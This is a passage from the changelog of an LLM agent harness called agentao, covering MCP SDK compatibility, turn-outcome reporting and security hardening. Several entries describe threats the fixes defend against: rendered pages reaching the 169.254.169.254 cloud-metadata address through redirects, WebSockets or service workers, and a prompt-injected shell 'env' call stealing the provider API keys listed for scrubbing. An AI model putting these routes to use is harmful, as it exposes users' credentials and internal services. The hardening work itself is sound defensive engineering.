  get_event_loop().run_until_complete(coro)` — which could not distinguish
  "`asyncio.run` refused to nest" from "the coroutine itself raised
  `RuntimeError`", and reported the latter as an unrelated *"There is no
  current event loop"* message. It also could not have worked as intended:
  `run_until_complete` fails on a loop that is actually running, and `coro` is
  already closed by the time the handler retries it. It now asks whether a
  loop is running, and hands the coroutine to a worker thread with its own
  loop when one is — so an async host driving this sync tool works, and
  genuine errors propagate with their own message. Found by the new tests.
  (The helper survives as `_run_coroutine_blocking`, reached only by the sync
  `execute` wrapper now that `web_fetch` is async — see *Changed*.)

- **Stale extras in the developer guide.** `part-1/5-requirements.md` (both
  languages) still advertised `[pdf]` / `[excel]` / `[image]` / `[crypto]` /
  `[google]`, which were removed in **0.4.12** and have not resolved since.

- **A failing fallback no longer discards a good page.** `_run_fallback`
  returned one string for both "not configured" and "tried and failed", so a
  host that installed the extra but never ran `playwright install chromium`
  got the browser-setup error *instead of* the static HTML `web_fetch` had
  already fetched successfully — strictly worse than `fallback=none`. It now
  returns `(body, error)`; the primary result wins and the fallback's failure
  is appended as a note.

- **The local render reports HTTP status.** `page.goto` does not raise on
  4xx/5xx and the fallback is reached *from* `except httpx.HTTPError`, so a
  rendered 404 / paywall / bot-challenge page was handed to the model as
  though it were the requested document. A `>= 400` status is now a fallback
  failure, which means the caller keeps httpx's more accurate diagnosis. The
  status tracked is the *latest main-frame navigation*, not `goto`'s: a 200
  shell that client-side navigates to a 401/404/paywall after DOMContentLoaded
  leaves `page.content()` describing the later page while `goto` still reports
  200. Sub-frame and subresource responses are ignored — a broken ad iframe or
  a missing image is not a failed page.

- **`extract_text=False` is honored on the fallback path.** The flag was
  dropped the moment the fallback fired, so a caller asking for markup — to
  read an `href`, a `<meta>`, or an embedded JSON blob — silently got prose
  back and reported the data as absent.

- **The headless browser gets a scrubbed environment.** `chromium.launch()`
  passed no `env=`, so the browser tree inherited agentao's own provider
  credentials. It now routes through `capabilities/process.py::build_child_env()`
  like every other child agentao spawns — this is the one child that executes
  attacker-controlled JavaScript.

- **Every in-browser request is re-validated against the URL policy.** The
  httpx path checks every redirect hop, but once Chromium took over it chased
  redirects and client-side navigation unguarded — a page that passed the
  guard and then navigated to `169.254.169.254` had that body returned to the
  model. A `page.route` handler now re-applies `validate_outbound_url` to
  **all** requests, not only navigations: a permissive-CORS or JSONP endpoint
  lets the page's own JavaScript read an internal response and write it into
  the DOM, which is precisely what `page.content()` returns, and a no-CORS
  request still reaches an internal service as a side effect. Verdicts are
  cached per `(scheme, host, port)` so a page pulling fifty assets from one
  origin costs one DNS resolution; `data:` / `blob:` / `about:` are passed
  through untouched (they never leave the machine, and the policy rejects any
  non-http(s) scheme). The handler is installed on the **browser context**,
  not the page: a page-level route does not cover a popup opened with
  `window.open`, whose very first request would otherwise reach an internal
  target unchecked. The check itself runs in a worker thread with its own
  budget: `validate_outbound_url` calls `socket.getaddrinfo`, and doing that on
  the event-loop thread would stall the very timer enforcing the render
  ceiling — letting a page-controlled hostname defeat it just by resolving
  slowly. A stalled lookup blocks the request rather than passing it. The
  thread is a *daemon* thread rather than `asyncio.to_thread`: the latter uses
  the loop's default executor, which `asyncio.run` joins at shutdown, so a
  lookup that outlived its budget would still be waited on during teardown
  (cancelling the future does not cancel the thread) and the ceiling would be
  defeated on the way out instead of on the way in. Because those threads are
  abandoned rather than joined, they are bounded three ways: lookups in flight
  for the same origin are deduplicated (a page can queue a hundred requests to
  one host before the first resolution returns), concurrent lookups per render
  are gated, and a global cap refuses — and therefore blocks — a check once too
  many are live, so a page spraying randomised hostnames that miss the cache by
  construction cannot accumulate threads until the process dies.

  **WebSockets get their own guard.** They do not pass through
  `context.route` — Playwright intercepts them via `route_web_socket` — so
  rendered JavaScript could otherwise open `ws://169.254.169.254/`, reach an
  internal endpoint, and copy accepted frames into the DOM that
  `page.content()` returns. `ws://` / `wss://` are mapped onto `http` /
  `https` for the validator, which speaks only those (the schemes share
  default ports, so the target checked is the same one). This is why the
  extra floors at **playwright>=1.48**, where `route_web_socket` landed,
  rather than the 1.40 it was first written against.

  **Service workers are blocked.** Playwright's own documentation for `route`
  says it "will not intercept requests intercepted by Service Worker" and
  recommends setting `serviceWorkers` to `'block'` when using request
  interception; the default is `'allow'`. Without it an untrusted page could
  register a worker and reach loopback or cloud-metadata straight through the
  guard. A one-shot render has no use for them.

- **Downloads are disabled in the render context.** Playwright's
  `new_context()` defaults `accept_downloads` to true ("Whether to
  automatically download all the attachments" — its own docs), and crawl4ai
  had it off. `web_fetch` reads `page.content()` and nothing else, so a
  download could only ever be a hostile page writing to the host's disk.

  **A second crawl4ai default is deliberately not carried over.** Its
  `BrowserConfig` set `ignore_https_errors=True`; the render context sets it
  explicitly to `False`. Pages with an expired or self-signed certificate that
  crawl4ai used to render now fail. This is intentional: the fallback runs
  *after* the certificate-verifying httpx path failed, so ignoring cert errors
  would mean a site whose TLS is broken — or being intercepted — fails
  correctly on the primary path and is then rendered and handed to the model as
  though it were fine. A JS-rendering fallback is not a licence to relax TLS,
  and `url_policy` already blocks the non-public targets where a self-signed
  certificate is most common.

- **An unhydrated DOM is no longer returned as a successful render.** The
  settle step absorbs its own timeout by design — long-poll pages never reach
  `networkidle` and their DOM is already usable — but it also swallowed a
  crashed renderer, and would swallow Playwright dropping the `networkidle`
  literal. Those now fail the render, so the caller keeps the static shell and
  says why, instead of presenting a half-rendered page as the article.

- **The render has a wall-clock ceiling.** `page.content()` takes no timeout
  at all, so the `goto`/settle timeouts bounded navigation only and a page
  that pegged its renderer afterwards blocked the caller forever. The budget
  covers browser launch and setup as well as navigation — `launch`,
  `new_context`, `route` and `new_page` are driver channel calls with no
  timeout of their own, so a driver wedging in any of them would hang
  `web_fetch` with the browser left running. Teardown is
  bounded too, and wrapped so a failing `browser.close()` cannot replace the
  error that actually explains the failure. Bounding `browser.close()` alone
  was not enough: `async_playwright()`'s own `__aexit__` waits on the same
  driver with no deadline, and `__aenter__` can hang just as long if the
  driver spawns but never completes its protocol handshake — a wedge that
  never even reaches teardown. The context is now driven by hand, with
  startup, render, and teardown each carrying a budget; a driver that blows
  through one is killed rather than left running.

  The kill is deliberately **not** `kill_process_tree()`. That helper
  documents its precondition — `start_new_session=True` makes the child a
  group leader, so `pid == pgid` and `killpg(pid)` reaps the tree. Playwright
  spawns its driver with no new session, so it shares agentao's process group
  and its pid is not a pgid; `killpg` on it would fail, or on a coincidence
  signal an unrelated group. Verified against the installed 1.61.0 (`pgid` of
  the driver == agentao's own).

- **The retired-value substitution is visible.** The warning went only to the
  `agentao` logger, whose sole handler is `agentao.log`'s file handler — no
  operator ever saw it. It is now also projected into the tool description,
  matching how `AGENTAO_WEB_FETCH_ALLOW_CIDRS` surfaces its own relaxation.

- **The settle handler no longer swallows real failures.** A bare
  `except Exception` at DEBUG absorbed a crashed renderer, and would absorb
  Playwright dropping the `networkidle` literal (already DISCOURAGED
  upstream) — every fallback would silently stop waiting for hydration with
  nothing above DEBUG in the log. Only the expected timeout is quiet now.

- **The browser is no longer forced to send the httpx User-Agent.** That
  string stops before the `Chrome/<ver>` token, so as a *browser* UA it
  contradicted the truthful `Sec-CH-UA` headers Chromium keeps sending — a
  stronger bot signal than Chromium's own identity.

- **`--extra playwright` reaches the publishing workflows.** It was added only
  to `ci.yml`'s test job, so the API-drift guard `importorskip`ped away in
  `publish.yml` and `publish-testpypi.yml` — the two workflows that gate PyPI
  publication, and exactly the "silently retire the guard" outcome the extra
  was added to prevent.

## [0.4.17] — 2026-07-29

An **SDK-compatibility release**. `mcp` 2.0.0 landed on 2026-07-28 as a breaking
rewrite of the wire models, and agentao's dependency floor had no upper bound —
so a fresh install of 0.4.16 already resolved to it, and every MCP path failed.
0.4.17 makes agentao run on both majors and puts CI in a position to notice next
time.

No breaking changes. It upgrades in place.

### Added

- **MCP SDK 2.x support, alongside 1.x.** `mcp` 2.0.0 shipped 2026-07-28 and is
  a breaking release; agentao now runs on either major. The differences are
  probed off the installed SDK rather than sniffed from a version string — a
  version string is a second source of truth that a vendored or patched SDK
  would make wrong. See `agentao/mcp/_compat.py`.

- **A CI job that runs the MCP boundary tests against both majors**
  (`mcp==1.26.0`, `mcp>=1,<2`, `mcp>=2,<3`). The lockfile pins one version, so
  the existing test job can only ever exercise that one — and every defect
  fixed below passed a fully green suite on one major while being fatal on the
  other. `build` now gates on this job: a wheel whose MCP path is broken on a
  major its metadata claims to support should not be publishable.

### Changed

- **`mcp>=1.26.0` → `mcp>=1.26.0,<3`.** The bare lower bound let a fresh
  install silently resolve to 2.0 against code that only spoke 1.x. Upstream
  still ships v1 — 1.29.0 landed the same day as 2.0.0 — so agentao tracks both
  majors rather than forcing hosts off 1.x. The floor rises only when agentao
  actually needs a 2.x-only capability, and on a major boundary. The lockfile
  tracks the newest 2.x; the floor and the newest 1.x are held by CI.

- **The four-domain taxonomy is stated once in the system prompt** (#147).
  `identity`, `task_classification`, and `completion_standard` each enumerated
  the same four domains from a different angle, so no section was authoritative
  and all three were free to drift. They now share one table in
  `task_classification` (Domain | Covers | Deliver | Done when); `identity`
  keeps the bare names and `completion_standard` points at the "Done when"
  column. `## Failure retry discipline` was a near-verbatim restatement of
  Reliability #3 and is folded into it. No rule is dropped. Static sections go
  2542 → 2320 tokens (−8.7%), but that saving sits in the cached stable prefix —
  the point is removing the drift surface, not the tokens.

### Fixed

- **Every MCP tool call failed on mcp 2.0.** 2.0 moved its wire models into the
  split-out `mcp-types` package and renamed each field from its camelCase JSON
  name to a snake_case Python attribute, demoting the old name to an alias —
  which attribute access does not honor. Five sites broke: `Tool.inputSchema`
  (raised on every turn, since the tool schema is rebuilt per turn), plus
  `CallToolResult.isError`, `.structuredContent`, `ImageContent.mimeType`, and
  the `ToolAnnotations` hints.

- **Streamable HTTP could not connect on mcp 2.0** — the default transport for
  a bare `url`. Two independent causes: `create_mcp_http_client` moved to
  `httpx2`, so the `httpx.Timeout` agentao passed raised `TypeError: unhashable
  type: 'Timeout'`; and 2.0 dropped the trailing `get_session_id` from the
  yielded stream tuple, so a 3-element unpack raised `ValueError: not enough
  values to unpack (expected 3, got 2)`.

- **Per-request tool-call timeouts raised on mcp 2.0.** `read_timeout_seconds`
  went from `timedelta` to float seconds and flows into `anyio.fail_after`,
  where a `timedelta` is a `TypeError`.

- **`McpTool.mcp_annotations` keys are stable across both majors.** The dump now
  uses `by_alias=True` — a no-op on 1.x, where the field names already are the
  camelCase spec names — so hosts introspecting `readOnlyHint` /
  `destructiveHint` (documented in the 0.4.3 notes) keep working unchanged.
  Without it, a trusted server's `destructiveHint=true` would stop forcing
  confirmation on 2.x. That defect was latent rather than live: the tool-schema
  crash above fires first on every turn, so no call ever reached the check.

- **MCP tests now build their inputs from real `mcp.types` models.** The fakes
  were `SimpleNamespace` / `MagicMock` stand-ins carrying agentao's assumption
  about the wire shape instead of the SDK's, and the Streamable HTTP fixture
  hardcoded the 1.x 3-tuple. That is why a 3600-test suite stayed green through
  all of the above. `MagicMock` was the worst of the three: it answers `hasattr`
  for every name, so it satisfies a 2.x-shaped probe even on a 1.x SDK.

---

## [0.4.16] — 2026-07-25

A **boundary-hardening release**. 0.4.15 was about the harness not lying about
its own internals; 0.4.16 extends that to the seams where agentao talks to
something it does not control — an ACP server subprocess, an MCP server over
HTTP, a keyless search backend, a clipboard helper — and to the audit trail
meant to record what happened at those seams.

No breaking changes. It upgrades in place.

### Added

- **A host embedding the interactive CLI can now inject its own runtime.**
  `Agentao` has accepted `extra_tools` / `disable_tools` / `enabled_tools` for
  several releases and `build_from_environment(**overrides)` forwards them, but
  `AgentaoCLI` called the factory with a fixed kwarg set and `main()`
  constructed the CLI and ran it immediately — so that contract was unreachable
  from the CLI surface. The only workaround was patching module globals, which
  fails silently: `cli/app.py` imported a name it never used, and four test
  modules had been patching that dead name while intercepting nothing.

  Both entry points now take a keyword-only `agent_factory`, called as
  `factory(transport=self, max_context_tokens=…, plan_session=…)` — the shape
  `acp/session_new.py` already used. Default `None` takes the existing path, so
  console startup is unchanged.

  ```python
  main(agent_factory=partial(
      build_from_environment,
      extra_tools=[NewsSearchTool(), PublishTool()],
      disable_tools={"web_search"},
  ))
  ```

  The returned runtime is checked against the post-conditions the CLI relies on
  — required attributes reported together in one `TypeError`, a non-`None`
  `permission_engine`, a `_plan_session` identical to the CLI's, and the CLI
  reachable from both `agent.transport` and `tool_runner._transport` — so a
  mis-wired factory names the violated contract instead of failing later as an
  `AttributeError` on `None`. A `functools.partial` that pre-binds `transport=`
  is rejected before the call, since Python resolves `partial(f, k=v)(k=w)` to
  `w` and would silently discard the host's value while every post-condition
  still passed. (#133)

### Changed

- **ACP `session/prompt` now reports why a turn actually ended.** It could only
  answer `end_turn` or `cancelled`; its own TODO said the richer reasons were
  unreachable because `agent.chat()` returned no structured termination
  metadata. `TurnOutcome` shipped that metadata in 0.4.15, and two of the three
  host surfaces (`agentao run`, the sub-agent path) were migrated onto it while
  ACP was not — so a DeepChat-style client got `end_turn` for a turn that
  doom-looped, exhausted its iteration budget, or was cut off at the token
  limit. The mapping is now:

  | Outcome | `stopReason` |
  |---|---|
  | client cancelled | `cancelled` (wins over everything) |
  | iteration budget exhausted | `max_turn_requests` |
  | `doom_loop` | `max_turn_requests` |
  | `length_truncated` | `max_tokens` |
  | `no_output` / `reasoning_only` / `llm_error` / healthy | `end_turn` |

  `no_output` and `reasoning_only` stay `end_turn` deliberately — the turn did
  end normally, the model simply produced no prose, and ACP's enum describes
  why a turn *stopped*, not whether it said anything. `llm_error` also stays
  `end_turn` as the least-bad option: the closed enum has no member for "the
  model call failed", and `refusal` means the agent declined on content
  grounds, so reporting an API outage that way would trade a vague answer for a
  false one. The failure is still visible — the `[LLM API error: …]` notice is
  the turn's streamed content. Surfacing it as a JSON-RPC error would be more
  truthful but changes the response *shape*, so it needs its own decision.

  Budget exhaustion cannot be recovered from `TurnOutcome` (it is deliberately
  a separate axis), so `ACPTransport` records it as it happens and
  `session/prompt` clears the flag before each turn — otherwise one exhausted
  turn would make every later turn on that session report `max_turn_requests`.

- **`AcpSessionPromptResponse.stopReason` gained `max_tokens`.** The local enum
  had drifted from ACP v1, listing only four of the five members, so the schema
  could not express a token-limit stop even once the runtime could detect one.
  `docs/schema/host.acp.v1.json` regenerated. Additive to a response enum: a
  spec-conformant client already handles all five, but a client that hardcoded
  the previous four will see a value it did not expect.

- **MCP URL-transport requests now identify themselves.** SSE and Streamable
  HTTP traffic — the content-type preflight, the handshake, and every tool call
  — went out with httpx's bare `python-httpx/x.y.z`, leaving agentao anonymous
  in server logs and indistinguishable from any other Python client. They now
  send `User-Agent: agentao-mcp/<version>`. A `User-Agent` set in the server's
  `headers` block still wins, matched case-insensitively, and the config dict is
  copied rather than mutated, so a reconnect does not accumulate state. stdio
  servers are unaffected. This does change what remote servers see on the wire:
  a server or WAF that filters on User-Agent may need its allow-list updated,
  which the `headers` override covers. (#136)

- `run_loop`'s 31-branch slash-command if/elif chain is now a dispatch table
  (353 → 127 LOC, cyclomatic complexity 74 → 26); no behavior change, and
  `/sandbox` gained the tab-completion entry it had always been missing. (#142)

### Fixed

- **`web_search` no longer reports a bot-challenge page as "no results".**
  `html.duckduckgo.com` answers HTTP 202 with a captcha page instead of a result
  set. `raise_for_status()` waves 202 through (it is 2xx), the result-div scan
  yields zero, and the formatter turned that into a confident
  `No search results found for: <query>` — indistinguishable from a genuine
  empty answer. On a keyless host that was the entire search surface failing
  quietly, since `duckduckgo` is the only backend in the chain when no key
  resolves. The backend now raises when the response is 202 **or** the `#links`
  results container is absent; a real zero-hit SERP still renders `#links` and
  stays terminal. Relatedly, six sites claiming the `jina` backend works without
  a key were corrected — `s.jina.ai` began requiring one after 0.4.14. (#135)

- **`/copy` can no longer hang the input loop.** It called `subprocess.run`
  three times with no `timeout=`, so a `pbcopy` wedged on an unresponsive
  pasteboard server blocked the loop with no way out but `Ctrl+C`. Every attempt
  is now bounded at 5s and routed through `run_captured`, so a grandchild
  holding the captured pipe cannot outlive the bound. A timeout or non-zero exit
  now also falls through to the next utility instead of aborting the chain —
  a failing `pbcopy` previously reported "Copy failed" without ever trying
  `xclip` or `xsel`. (#139)

- **Replay's v1.2 audit events are rendered, not just recorded.**
  `tool_lifecycle`, `subagent_lifecycle`, and `permission_decision` exist so an
  embedded host has one audit artifact instead of two parallel streams. The
  JSONL side was correct; both CLI views were not — `--raw` degraded them to a
  sorted payload-key preview, and the default grouped view dropped them
  entirely, because `_print_turn`'s event loop is an allowlist that silently
  skips an unnamed kind. A turn containing a **denied** permission decision and
  a **failed** tool rendered as a bare `└─ ok`. (#141)

- **`stop_all()` no longer crashes mid-shutdown and leaks servers.** It iterated
  the live `_clients` dict that a concurrent liveness poll could pop from,
  raising `dictionary changed size during iteration` and leaving the remaining
  subprocesses running. Now snapshots with `list(...)`. Bites concurrent
  embedding, not the CLI. (#137)

- **Killing an ACP server no longer orphans its grandchildren.** Server
  subprocesses were spawned without their own process group, so a force-kill
  reaped the server and left the MCP or shell children it had spawned running.
  They now start with `start_new_session` / `CREATE_NEW_PROCESS_GROUP`, the
  final force-kill routes through `kill_process_tree`, and a whole-tree sweep
  runs **unconditionally** after SIGTERM — a server that dies on SIGTERM without
  reaping its own children would otherwise still orphan them. (#137)

- The ACP handshake-fail-streak reset now holds `_recovery_lock`, like every
  other write to that state. (#137)

### Security

- **A hostile or buggy ACP server can no longer write escape sequences to your
  terminal.** `render._sanitize_terminal_text` strips C0/DEL/C1 controls and the
  Unicode bidi-override characters behind Trojan-Source (CVE-2021-42574) at
  **every** display boundary — the render layer *and* the inline interaction
  handler in `cli/commands_ext/acp.py`. The second one is the point: a sanitizer
  that covers all but one display path is not a sanitizer. (#137)

- **Server output is bounded at three levels.** `helpers._cap_chunk` caps agent
  chunks, permission titles, and `ask_user` questions at 262,144 chars;
  `render._MAX_AGENT_RENDER_CHARS` bounds cross-chunk Markdown accumulation at
  1,048,576 chars; and `process._read_bounded_lines` caps a single stdout frame
  at 16 MiB.
  The last closes the deepest hole: `for raw_line in stdout` would buffer one
  gigantic newline-less line whole — gigabytes in RAM — before Python ever saw
  it. The reader now consumes the pipe in 64 KiB `read1()` slices, reassembles
  newline-delimited frames across them, and **drops** an oversized frame whole
  rather than truncating it, because a truncated line is not valid JSON-RPC and
  would mis-parse instead of letting the pending request time out cleanly. Peak
  per-frame memory is 16 MiB + one read slice. (#137, #138)

---

## [0.4.15] — 2026-07-19

A **hardening release** on top of 0.4.14. The through-line is that the harness
must not lie about what happened, and must not leave you worse off than if it
had done nothing: an interrupted turn no longer bricks the session, `write_file`
can no longer destroy the file it was updating, turns that produce no answer are
classified rather than served as if they were answers, and the secret scanner
that had been sitting behind a disabled-by-default subsystem now runs on the
live path.

**Two breaking changes**, both flagged `BREAKING` inline below:

1. `SubagentLifecycleEvent(phase="failed")` now also means "returned without
   answering", not only "raised". Hosts branching on it will see it fire on
   ordinary non-answers.
2. Child processes no longer inherit agentao's provider credentials. **If an
   MCP or ACP server you configured relies on inheriting `OPENAI_API_KEY` (or
   similar), it will now fail with 401** — declare the key in its `env` block,
   or set `AGENTAO_SCRUB_CHILD_ENV=0`.

Everything else upgrades in place.

### Added

- **`TURN_END.incomplete_reason`** — a single closed vocabulary classifying
  *why* a turn's `final_text` is not a complete, model-authored answer, in
  three families: the turn ended normally but the model produced no answer
  (`no_output`, `reasoning_only`); the harness halted a turn that was not
  converging (`length_truncated` — now covering a final answer cut off
  mid-sentence, not only truncated tool calls; `doom_loop`); or the LLM call
  itself failed (`llm_error`). `None` on a healthy turn, and suppressed when the
  turn was cancelled or already errored — those carry their own status. Every
  turn-ending path commits exactly one value, so there is no unclassified
  ending. The replay adapter mirrors it onto the `TURN_COMPLETED` record.
  Additive, so no `schema_version` bump (same precedent as `tool_count`).
  `max_iterations` is a sixth way a turn ends without a complete answer but is a
  deliberately separate axis — a sticky transport flag with its own exit code 4
  and `on_max_iterations` interaction, not a value here. (#126)

- **`error.reason` on the `agentao run` envelope** — the machine-readable
  discriminator behind `error.type`, carrying the `incomplete_reason` value
  verbatim so a caller can branch on `no_output` vs `reasoning_only` without
  parsing `message`. (#126)

- **`agent.last_turn` → `TurnOutcome`** — a structured read-after companion to
  `chat()` / `arun()`'s string return. `chat()` still returns the turn's text
  as a `str`; `agent.last_turn` (a frozen `TurnOutcome` with `text`, `status`,
  `incomplete_reason`, `tool_count`, `error`, and an `is_answer` convenience)
  is how a host tells a real answer from a placeholder / harness notice without
  subscribing to the internal `Transport`. `TurnOutcome` is importable from the
  top-level package (`from agentao import TurnOutcome`) without pulling the LLM
  stack. Mirrors the `TURN_END` payload field-for-field — both are fed from a
  single gated value in `runtime/turn.py`, so they never disagree. (#126)

- **`agentao/security/secret_scan.py`** — the credential-pattern scanner, moved
  out of `agentao/replay/` and put on the live path. It previously ran only
  inside replay, which is off by default, so `agentao.log` and
  `.agentao/tool-outputs/` were unscanned in every default install. Now
  `agentao.log`'s file handler redacts through a `logging.Formatter` (**not** a
  `Filter` — a `Filter` mutates the shared `LogRecord` and would leak the
  redaction into every other handler on the logger, including an embedded
  host's own), and tool outputs are scanned before they hit disk, with a note
  appended to the tool result when hits occurred. `memory/guards.py` now derives
  its patterns from the same list instead of keeping a weaker third copy that
  was missing `sk-ant-`, JWTs, Slack, and most GitHub token variants.
  `agentao/replay/redact.py` re-exports for existing callers.

  Scope is deliberate and narrow: **disk artifacts only**. The conversation
  sent to the LLM provider stays verbatim, because pattern matching cannot tell
  a live credential from a test fixture and redacting the model's view breaks
  legitimate work. `.agentao/sessions/*.json` and `.agentao/background_tasks.json`
  are likewise not scanned — both are read back into `agent.messages`, so
  redacting them would corrupt a resumed conversation. Best-effort defense in
  depth, not a seal. (#128)

### Changed

- **Tool calls from a length-truncated assistant message are no longer
  executed.** When a response ends with `finish_reason == "length"` (or a
  provider spelling of it, such as Gemini's `MAX_TOKENS`), any tool calls it
  contains are cut off mid-serialization — the arguments may be *valid JSON and
  still be wrong*, e.g. a `write_file` whose `content` stops halfway or a shell
  command missing its final argument. Agentao used to run them. It now records
  the assistant message, answers each call with a re-issue prompt instead of a
  result, and lets the model send the call again with complete arguments. A
  call truncated before its name arrived is stamped `"unknown"` so the
  assistant/tool pairing stays valid. `LENGTH_TRUNCATION_ABORT_THRESHOLD = 3`
  finalizes the turn through the Stop hook after three consecutive truncations,
  so a model that keeps re-truncating an oversized call cannot burn the whole
  `max_iterations` budget. `TURN_END.tool_count` counts the refused calls, so it
  still matches the execute path. (#125)

- **BREAKING — child processes no longer inherit agentao's own provider
  credentials.** Shell children, MCP server children, ACP server children, and
  everything routed through `run_captured` (plugin hooks, `search_file_content`)
  now start from `build_child_env()`, which drops the 12 `HARNESS_ENV_KEYS`:
  `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GEMINI_API_KEY`,
  `AZURE_OPENAI_API_KEY`, `DEEPSEEK_API_KEY`, `MOONSHOT_API_KEY`,
  `GROQ_API_KEY`, `MISTRAL_API_KEY`, `OPENROUTER_API_KEY`, `XAI_API_KEY`,
  `LLM_API_KEY`, `LLM_EXTRA_BODY`. A prompt-injected `run_shell_command("env")`
  then finds nothing worth stealing. The key for the *configured* provider is
  additionally derived the way `embedding/factory.py` resolves it
  (`LLM_PROVIDER=QWEN` → `QWEN_API_KEY`), so users on a provider outside that
  static list are covered rather than silently uncovered.

  **What this breaks:** an **MCP or ACP server that relied on inheriting the
  key now gets a 401** — declare it explicitly in that server's `env` block
  (applied *after* the scrub), or set `AGENTAO_SCRUB_CHILD_ENV=0` to restore
  full inheritance process-wide. Same for running `agentao run`, or any script
  that calls the provider, from inside the agent's own shell.
  `ShellRequest(env=None)` consequently no longer means "inherit everything" —
  it means "inherit minus `HARNESS_ENV_KEYS`"; pass an explicit `env` for full
  control.

  **`GOOGLE_API_KEY` is deliberately NOT dropped.** It is the standard name for
  Maps / Drive / YouTube credentials as well, and stripping it would break user
  scripts the agent was asked to run, with a 401 pointing nowhere near agentao.
  If you authenticate Gemini through `GOOGLE_API_KEY` rather than
  `GEMINI_API_KEY`, that key still reaches child processes. Only agentao's own
  keys are dropped; the user's other secrets (AWS, GitHub, `DATABASE_URL`) are
  untouched — scrubbing those is the host's call. Defense in depth, not a seal:
  `cat .env` still works. Also fixes a false comment at `mcp/client.py` that
  had claimed a sanitized base environment while passing `dict(os.environ)`.
  (#128) The agent is a
  distinct principal from the user, and nothing the LLM decides to run needs
  the key that pays for the LLM. Only agentao's keys are dropped; the user's
  other secrets (AWS, GitHub, `DATABASE_URL`) are untouched — scrubbing those
  is the host's call. **Set `AGENTAO_SCRUB_CHILD_ENV=0` to restore full
  inheritance**, which is required if you run `agentao run`, or any script that
  calls the provider, from inside the agent's own shell. Note that
  `ShellRequest(env=None)` consequently no longer means "inherit everything".
  Also fixes a false comment at `mcp/client.py` that had claimed a sanitized
  base environment while passing `dict(os.environ)`.

- **BREAKING — `SubagentLifecycleEvent(phase="failed")` now also covers
  "returned but never answered".** It previously meant only "the sub-agent raised". A
  sub-agent that hit its iteration budget, produced no output, emitted only
  reasoning, was cut off at the token limit, doom-looped, or whose LLM call
  failed now reports `phase="failed"` with `error_type="incomplete:<reason>"`,
  and the tool result carries a "did not finish" header instead of a stats
  footer stapled onto `[No response]`. This makes the sub-agent path the first
  compliant consumer of `TurnOutcome` — previously the public host contract
  reported success for a sub-agent that had done nothing. **Hosts branching on
  `phase == "failed"` should expect it to fire on ordinary non-answers**, not
  just exceptions; check `error_type` to distinguish — a raised exception
  reports `error_type=type(exc).__name__`, a non-answer reports
  `incomplete:<reason>`.

  Note the suffix vocabulary here is the five `incomplete_reason` values **plus
  `max_iterations`**. `max_iterations` is deliberately *not* a
  `TURN_END.incomplete_reason` value (see above — it is a separate axis with
  its own exit code 4), but a sub-agent has no exit code and no
  `on_max_iterations` channel of its own, so this surface folds it back in as a
  sixth suffix. A host matching `error_type.split(":")[1]` against the
  documented five will miss it. Defensively, `cancelled`, `error`, and
  `unknown` can also appear when a `TurnOutcome` reports neither an answer nor
  a reason; treat any unrecognized suffix as "stopped short, cause
  unclassified" rather than matching exhaustively. (#128)

- **`FileSystem.write_text` implementations must now replace existing files
  atomically.** The protocol docstring states the requirement; delegating
  wrappers inherit it from `LocalFileSystem`, but a from-scratch host
  implementation owes the guarantee. (#128) (#128)

### Fixed

- **An interrupted turn no longer bricks the session.** `Ctrl+C` (or host
  cancellation, or an unexpected exception) between the assistant message
  carrying `tool_calls` and the tool results landing in history left orphaned
  `tool_calls` with no matching `role: "tool"` reply. The strict
  Chat-Completions contract rejects that, so **every subsequent turn 400'd**
  until `/new` — the conversation was unrecoverable, and `/sessions resume`
  restored the broken state. Agentao already upheld this invariant on the
  doom-loop and length-truncation paths; interrupt was the one hole.
  `runtime/sanitize.py::backfill_orphaned_tool_calls` now stamps placeholder
  results from all three abnormal-exit handlers. The placeholder deliberately
  says the tool *may or may not* have run and warns against blind retry:
  results are committed per batch, so an interrupt during the last call of a
  batch discards its earlier siblings' results too, and re-running a
  `write_file` that already succeeded is its own kind of damage. (#128)

- **`write_file` can no longer destroy a file it was only meant to update.**
  `LocalFileSystem.write_text` used a plain `open(path, "w")`, which truncates
  *before* writing — an interruption in between (Ctrl+C, host OOM, `kill`) left
  the user's source file empty or half-written. Existing files are now replaced
  via a sibling temp file and `os.replace`, atomic at the VFS level. A
  read-only target still raises `PermissionError`: rename permission lives on
  the *directory*, so without an explicit check the change would have silently
  defeated `chmod 444`. Not fsync'd — this closes the process-death window,
  not the power-loss one. (#128)

- **`edit_file` no longer hides that a match was ambiguous.** The tool counted
  occurrences of `old_text` and then discarded the count. First-match-wins is
  the deliberate contract; silently dropping the signal was not. The message
  now reports how many remain and, when `old_text` occurs in `new_text`,
  withholds the `replace_all=true` suggestion that would rewrite the
  just-edited site. An empty `old_text` is now refused outright — it matched at
  every position and would have inserted `new_text` between every character. (#128)

- **A failed background sub-agent no longer discards its work.** With
  incomplete runs now reported as `status="failed"`, `check_background_agent`'s
  failure branch returned only `error` — so a long background task that ran out
  of iterations lost everything it had produced. It now surfaces the partial
  `result` alongside the reason. Background records carry an explicit
  `incomplete_reason` field so every reader — the tool, `/agent status`, the
  dashboard, and any host reading `.agentao/background_tasks.json` — separates
  "the sub-agent crashed" from "the sub-agent stopped short but produced work"
  without guessing from the presence of `result`. `/agent status` prints the
  partial output under a *Did not finish* header rather than only the error,
  and the dashboard counts unfinished runs separately from genuine failures so
  the red number keeps meaning something. (#128, #129)

- **`agent.events()` silently registered nothing when replay was enabled.**
  `ReplayAdapter` wraps the transport but had no `subscribe`, so a host that
  turned on `replay.enabled` lost every `HostEvent` subscription it had made —
  the adapter's own docstring admitted the gap. It now forwards to the inner
  transport, returning a no-op unsubscribe when the inner transport has none.
  Affects every embedder running with replay on. (#126)

- **A turn cancelled mid-stream now reports `status: "cancelled"`.** When a
  cancellation token fired while the LLM was streaming, the model could return a
  normally-built empty message without raising, so the turn reached its ordinary
  ending site and emitted `TURN_END` with `status: "ok"` though it was
  interrupted. `runtime/turn.py` now reflects the cancellation in `status`, so
  the wire event and `agent.last_turn` both report it honestly (and a
  placeholder-vs-answer check does not read a cancelled turn as an answer). (#126)

- **`agentao run` no longer exits `0` on a turn that produced no answer.**
  A turn ending with an empty assistant message exited `0` and served the
  `[No response]` / `[No text response]` placeholder as if it were the model's
  answer; a turn the harness aborted after repeated length truncation or a
  doom loop did the same with its canned abort string; a final answer cut off
  mid-sentence at the token limit, and a turn whose LLM call failed outright
  (returning the `[LLM API error: …]` notice), likewise exited `0`. Automation
  reading `final_text` could not distinguish any of these from a real answer.
  All now exit `1` with a precise `error.type` — `empty_response` when the
  model said nothing, `length_truncated` / `doom_loop` when the harness halted
